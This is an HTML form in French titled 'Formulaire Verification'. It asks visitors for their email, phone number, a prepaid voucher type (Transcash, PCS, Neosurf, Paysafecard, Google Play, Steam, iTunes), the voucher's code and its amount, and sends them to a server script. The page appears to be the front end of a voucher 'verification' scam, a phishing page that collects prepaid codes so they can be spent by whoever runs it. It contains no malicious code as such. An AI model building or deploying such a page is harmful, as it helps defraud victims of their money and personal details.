<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Formulaire Verification</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">

     <!-- CSS intl-tel-input -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/css/intlTelInput.css" />

</head>

<body class="bg-light">

<div class="container mt-5">
  <div class="row justify-content-center">
    <div class="col-md-6">
      <div class="card shadow-lg border-0 rounded-3">
        
      <div class="card-header bg-primary text-white text-center">
            <h2>Remplissez le formulaire pour faire la vérification</h2>
        </div>
        <div class="card-body">
                <form action="traitement.php" method="post">

                    <div class="mb-3">
                        <label for="email" class="col-sm-2 col-form-label">Email * :</label>
                        <input type="email" class="form-control" id="email" name="email" required>
                    </div>

                    <div class="mb-3">
                        <label for="number" class="col-sm-2 col-form-label">Numéro * :</label><br>
                        <input type="tel" class="form-control" id="number" name="number" required>
                    </div>

                    <div class="mb-3">
                        <label for="typeRecharge" class="form-label">Type de recharge :</label>
                        <select class="form-control" list="recharge" id="typeRecharge" name="recharge" placeholder="Selectionner une recharge" required>
                            <option value="" selected disabled>-- Sélectionner une recharge --</option>
                            <option value="Transcash">Transcash</option>
                            <option value="Google Play">Google Play</option>
                            <option value="SteamCard">SteamCard</option>
                            <option value="Paysafe">Paysafe card</option>
                            <option value="PCS">PCS</option>
                            <option value="iTunes">iTunes</option>
                            <option value="Neosurf">Néosurf</option>
                        </select>
                    </div>

                    <div class="mb-3">
                        <label class="col-sm-2 col-form-label">Code :</label>
                        <input type="text" class="form-control" name="code" required>
                    </div>
                    <div class="mb-3">
                        <label class="col-sm-2 col-form-label">Prix :</label>
                        <input type="text" class="form-control" name="prix" required>
                    </div>
                    <div class="form-check form-switch">
                        <label class="form-check-label" for="choix">Cacher le code ? </label>
                        <input class="form-check-input" type="checkbox" id="choix">
                    </div><br>
                    <div class="col-12 text-center">
                    <button type="submit" name="submit" class="btn btn-success">Vérifier</button>
                    </div>
                </form>
            </div>
        </div>
    </div>
</div>

<!-- JS Bootstrap -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>

<!-- JS intl-tel-input -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/js/intlTelInput.min.js"></script>
<script>
  const input = document.querySelector("#number");
window.intlTelInput(input, {
  initialCountry: "auto",
  geoIpLookup: function (callback) {
    fetch("https://ipapi.co/json")
      .then(res => res.json())
      .then(data => callback(data.country_code))
      .catch(() => callback("fr"));
  },
  placeholderNumberType: "MOBILE", // <-- ajoute un exemple adapté
  utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
});
</script>

</body>
</html>
